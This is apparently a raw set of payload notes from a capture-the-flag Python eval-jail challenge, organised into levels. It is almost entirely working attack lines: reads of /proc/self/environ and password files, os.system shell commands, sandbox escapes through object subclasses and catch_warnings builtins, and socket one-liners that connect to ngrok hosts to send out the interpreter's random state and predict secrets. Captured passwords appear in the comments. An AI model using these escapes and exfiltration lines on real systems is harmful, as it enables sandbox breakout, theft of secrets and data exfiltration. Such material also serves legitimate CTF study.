# Level 0

open('/proc/self/environ').read()
# env.sh

open('/proc/self/cwd/problem.py').read()
open('problem.py').read()
# problem.py

open('/proc/self/cwd/password.txt').read()
# PuXqj7n4WNZzStnWbtPv

__import__("os").system("cat /proc/self/cwd/password.txt")
__import__("os").system("cat password.txt")

# Level 1

open('/proc/self/environ').read()
# Traceback (most recent call last):
#   File "problem.py", line 7, in <module>
    # result = eval(answer, {"open": None}) # Open is blocked!!
#   File "<string>", line 1, in <module>
# TypeError: 'NoneType' object is not callable

__import__("os").system("ps -ef")

# print(password)

# Krdi9yQuY8mHoteZDCF5

# Level 2

# __import__("os").system("cat /proc/$(echo 'nep1212' | ps -ef | grep 'nep1212' | head -1 | awk '{ print $2 }' )/cmdline ")

__import__("os").system(f'cat /proc/{__import__("os").getpid()}/maps')

[int(y, 16) for y in [x for x in open('/proc/self/maps').read().split('\n') if x.endswith('[stack]')][0].split(' ')[0].split('-')]


## Socket
# [[x.connect(('4.tcp.ngrok.io', 17297)), x.recv(9)] for x in [__import__('socket').socket()]]
[[x.connect(('8.tcp.ngrok.io', 13584)), x.send(b'a'*100), x.close()] for x in [__import__('socket').socket()]]

__import__("sys").version_info

[[x.connect(('2.tcp.ngrok.io', 19801)), x.send(bytes(str(__import__('random').getstate()), 'UTF-8')), x.recv(20)] for x in [__import__('socket').socket()]]

int([[x.connect(('2.tcp.ngrok.io', 19801)), x.send(bytes(str(__import__('random').getstate()), 'UTF-8')), x.recv(20)] for x in [__import__('socket').socket()]][0][2])

# 4003843491, correct!  The password is 'E46Dnqb5enAMgGArbruu'.

# Tests
{x.__name__: x for x in ().__class__.__base__.__subclasses__()}
dir({x.__name__: x for x in ().__class__.__base__.__subclasses__()}['Random'])
{x.__name__: x for x in ().__class__.__mro__}
''.__class__.__mro__[1].__subclasses__()

{x.__name__: x for x in ().__class__.__base__.__subclasses__()}['Random']().getstate()

int([[x.connect(('8.tcp.ngrok.io', 19530)), x.send(bytes(str({x.__name__: x for x in ().__class__.__base__.__subclasses__()}['Random']().getstate()), 'UTF-8')), x.recv(20)] for x in [__import__('socket').socket()]][0][2])


# Get Source

{x.__name__: x for x in ().__class__.__base__.__subclasses__()}['catch_warnings']()._module.__builtins__['__import__']('os').system('cat problem.py')


int([[x.connect(('0.tcp.ngrok.io', 18049)), x.send(bytes(str({x.__name__: x for x in ().__class__.__base__.__subclasses__()}['Random']().getstate()), 'UTF-8')), x.recv(20)] for x in [__import__('socket').socket()]][0][2])

# 2429818341, correct!  The password is '5F4p7aLgQ5Nfn5YM8s68'.